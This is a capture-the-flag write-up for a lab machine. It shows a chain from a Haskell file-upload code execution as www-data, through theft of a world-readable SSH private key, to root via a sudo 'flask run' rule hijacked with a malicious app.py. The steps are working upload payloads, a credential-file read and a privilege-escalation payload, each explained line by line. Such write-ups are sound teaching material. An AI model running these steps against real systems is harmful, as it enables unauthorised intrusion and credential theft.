# Write-up : "Fun With Functional #2" (Privilege Escalation to root)

**Target:** 10.10.0.43

**Difficulty:** Easy

**Date:** 16/09/2026

**Objective:** root.txt

**Techniques used:** Malicious file upload, arbitrary code execution (RCE), post-exploitation enumeration, SSH key theft, privilege escalation via sudo

**Tools used:** curl, ssh

> This challenge is the direct continuation of "Fun With Functional". The entry point (Haskell upload -> code execution as `www-data`) is identical. This write-up focuses on the additional step: going from `www-data` to `root`.

---

## 1. Confirming the already known entry point

As in the first challenge, the web server (port 5001) accepts uploading a Haskell file (`.hs`), compiles it with GHC, then executes the result. We directly reuse the RCE payload:

```bash
cat > exploit.hs << 'EOF'
import System.Process
main :: IO ()
main = do
    putStrLn "I love Haskell"
    output <- readProcess "id" [] ""
    putStrLn output
EOF

curl -s -X POST http://10.10.0.43:5001/homework -F "file=@exploit.hs"
curl -s http://10.10.0.43:5001/uploads/exploit.hs
```

**Result:** confirmation of command execution as `uid=33(www-data)`.

---

## 2. System reconnaissance as www-data

With command execution, we explore the system looking for an escalation path.

**What this command does:** we use `readProcessWithExitCode` (rather than `readProcess`) because this variant captures both normal output and errors, even when the command fails (`readProcess` alone raises an unhandled Haskell exception if the exit code isn't 0, which prevents seeing the result).

```bash
cat > exploit.hs << 'EOF'
import System.Process
main :: IO ()
main = do
    putStrLn "I love Haskell"
    (_, out, err) <- readProcessWithExitCode "bash" ["-c", "ps aux; echo ---; ls -la /home/prof/.ssh"] ""
    putStrLn out
    putStrLn err
EOF

curl -s -X POST http://10.10.0.43:5001/homework -F "file=@exploit.hs"
curl -s http://10.10.0.43:5001/uploads/exploit.hs
```

**Key findings:**

1. The process list (`ps aux`) shows that the Flask server itself is launched by root via `sudo -u www-data python3 /var/www/html/app.py` - normal startup behavior, not directly exploitable.
2. The `/home/prof/.ssh` folder contains a private SSH key (`id_rsa`) readable by everyone (permissions `rw-r--r--` instead of the expected `rw-------`). This is a classic misconfiguration: a private SSH key should never be readable by a user other than its owner.

---

## 3. Stealing the private SSH key and pivoting to the `prof` user

**Vulnerability exploited:** Overly permissive file permissions on a private key (CWE-276: Incorrect Default Permissions). Any user on the system (here `www-data`, via our RCE) can read this private key and use it to log in as its legitimate owner.

### Retrieving the key

```bash
cat > exploit.hs << 'EOF'
import System.Process
main :: IO ()
main = do
    putStrLn "I love Haskell"
    output <- readProcess "cat" ["/home/prof/.ssh/id_rsa"] ""
    putStrLn output
EOF

curl -s -X POST http://10.10.0.43:5001/homework -F "file=@exploit.hs"
curl -s http://10.10.0.43:5001/uploads/exploit.hs
```

The full content of the RSA private key is displayed in the response.

### Using the key to connect via SSH

We save the retrieved key to a local file, giving it the strict permissions SSH requires (`chmod 600` - otherwise SSH refuses to use it, considering it insecure):

```bash
cat > prof_key << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
[... content of the retrieved key ...]
-----END RSA PRIVATE KEY-----
EOF

chmod 600 prof_key
ssh -i prof_key prof@10.10.0.43
```

**Result:** successful interactive SSH connection as the `prof` user with private key.

---

## 4. Privilege escalation from prof to root

Once connected as `prof`, we check our root execution rights:

```bash
sudo -l
```

**Result:**

```
User prof may run the following commands on lambda:
    (root) NOPASSWD: /usr/local/bin/flask run
```

**Explanation:** this sudo rule allows `prof` to run the exact command `/usr/local/bin/flask run` as root, without needing a password (`NOPASSWD`). `flask` is the command-line tool of the Flask web framework; its `run` subcommand starts a web server from a Python application. The problem: Flask needs to know which Python file to load as the application, and this information can be provided in several ways, one of which the sudo rule doesn't block.

**Vulnerability exploited:** Hijacking an allowed binary via sudo (Sudo Privilege Escalation / GTFOBins-style). The sudo rule only allows the `flask run` command with no additional arguments (adding `--app myfile.py` changes the command line and sudo refuses it). But Flask has a default convention: if it receives no explicit instruction, it automatically looks for a file named `app.py` in the current folder. This convention allows bypassing the restriction: we place our own malicious file named exactly `app.py` in the folder where we run the command, and Flask (i.e. root) loads and executes it without us needing to modify the command line allowed by sudo.

### Creating the malicious Python file

**Explanation of the code:** when Python loads a module, all the code written at the top level (outside any function) runs immediately, as soon as the file is imported — before Flask even starts its web server. We use this moment to:

- read the file `/root/root.txt` (normally inaccessible to `prof`) and copy its content to `/tmp/root_flag.txt`, a location we can then read back as `prof`;
- make this output file readable by everyone (`chmod 644`), since it was just created by root and would otherwise be inaccessible to `prof`.

The two lines `from flask import Flask` and `app = Flask(__name__)` are **required**, not cosmetic: `flask run` imports the module and then looks for a Flask application object named `app`. Without it, Flask aborts with `Error: Failed to find Flask application or factory in module 'app'` and never fully starts. The application object is enough — no route needs to be defined, since our payload has already run during the import.

```bash
cat > /home/prof/app.py << 'EOF'
import os
os.system("cat /root/root.txt > /tmp/root_flag.txt; chmod 644 /tmp/root_flag.txt")

from flask import Flask
app = Flask(__name__)
EOF
```

**Detailed breakdown of the payload line:**

```python
os.system("cat /root/root.txt > /tmp/root_flag.txt; chmod 644 /tmp/root_flag.txt")
```

- `os.system(...)` runs the string it receives as a shell command, exactly as if it had been typed in a terminal — but here it inherits the privileges of the process running it. Since `flask run` was launched with `sudo`, this process runs as **root**, so the whole command executes with root rights.
- `cat /root/root.txt` reads the flag file. `/root` is the root user's home directory: `prof` normally has no access to it, but root does, which is exactly why we needed to run our code from inside the root process.
- `> /tmp/root_flag.txt` redirects that output into a new file in `/tmp`. `/tmp` is world-writable, so it's a convenient drop location that `prof` can reach afterwards. The file is created **owned by root** (since root is writing it).
- `;` chains the two commands: the second one runs right after the first, regardless of its result.
- `chmod 644 /tmp/root_flag.txt` fixes the permissions of the file we just created. Without this, the file would be owned by root with default permissions and `prof` might not be able to read it back. `644` grants read+write to the owner (root) and **read** to everyone else — including `prof`, who can now `cat` it.

In short: this single line uses the temporary root privilege to copy a root-only file into a spot the unprivileged `prof` user can read, then loosens its permissions so `prof` can actually retrieve it.

### Placing the file and executing

We run the command from `/home/prof`, where our `app.py` now sits. Flask automatically loads `app.py` from the current folder, executing our top-level code with full root rights during the import, before the web server actually starts serving:

```bash
cd /home/prof
sudo /usr/local/bin/flask run
```

Once the server prints its startup line (`Running on http://127.0.0.1:5000`), our payload has already run. We stop it with `Ctrl-C`.

### Retrieving the flag

```bash
cat /tmp/root_flag.txt
```

The content of `/root/root.txt` is displayed: this is the final flag we were looking for.

```
EPI{}
```

---

## Summary of exploited vulnerabilities

| #   | Vulnerability                                  | Type / Category                              | Short explanation                                                                                                                                              |
| --- | ---------------------------------------------- | -------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | Upload and execution of arbitrary Haskell code | Unrestricted Upload / RCE (CWE-434)          | Initial entry point, obtaining a shell as `www-data`                                                                                                           |
| 2   | Private SSH key readable by everyone           | Incorrect Default Permissions (CWE-276)      | Allows stealing the `prof` user's identity without knowing their password                                                                                      |
| 3   | Overly permissive sudo rule on `flask run`     | Sudo Misconfiguration / Privilege Escalation | Flask's default loading convention (`app.py` in the current folder) allows executing arbitrary code as root without modifying the command line allowed by sudo |

---

## Full exploitation chain (visual summary)

```
Upload of a malicious .hs file
        |
        v
Command execution as www-data
        |
        v
Reading "prof"'s private SSH key (permissions too open)
        |
        v
SSH connection as "prof" with the stolen key
        |
        v
sudo -l reveals: NOPASSWD on "flask run"
        |
        v
Dropping a malicious app.py in the current folder
        |
        v
"sudo flask run" executes our code as root
        |
        v
Reading /root/root.txt (final flag)
```

---

## Conclusion

- **Initial access:** RCE via upload of a non-sandboxed Haskell file -> shell as `www-data`.
- **Pivot:** theft of a poorly protected private SSH key -> access as `prof`.
- **Privilege escalation:** hijacking the sudo rule `NOPASSWD: flask run` via Flask's `app.py` loading convention -> code execution as root.
- **Root flag:** obtained in `/root/root.txt`.

---

## Evidences

### Flag user.txt

![Flag user.txt](Evidences/Reconnaissance%20du%20systeme.png)

### Flag

![Flag](Evidences/Flag%20fun%20with%20fonctional%202.png)
